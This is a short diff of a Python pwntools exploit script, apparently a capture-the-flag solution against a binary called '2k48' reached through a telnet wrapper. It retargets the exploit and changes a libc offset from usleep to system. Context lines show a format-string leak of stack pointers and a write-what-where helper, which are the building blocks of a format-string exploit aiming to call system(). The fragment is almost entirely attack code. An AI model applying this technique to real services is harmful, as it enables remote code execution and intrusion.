@@ -3,11 +3,11 @@
 from pwn import *
 import time
 
-#p = process('telnet.sh')
-#usleepToSystemOffset = -0x224b0 #find this by leaking libc
+p = process('telnet.sh')
+usleepToSystemOffset = -0xa3d80 #find this by leaking libc
 
-p = process('2k48')
-usleepToSystemOffset = -0xa54a0
+#p = process('2k48')
+#usleepToSystemOffset = -0xa54a0
 
 def vuln(formatStr,firstTime = False):
     if not firstTime:
@@ -42,7 +42,7 @@ def www(what,where,munge = False):
         where += 1
 
 
-gdb.attach(p)
+#gdb.attach(p)
 time.sleep(1)
 leaks = vuln('%d 0x%x 0x%x').split()
 stack = (int(leaks[8],0)) #pointer on stack
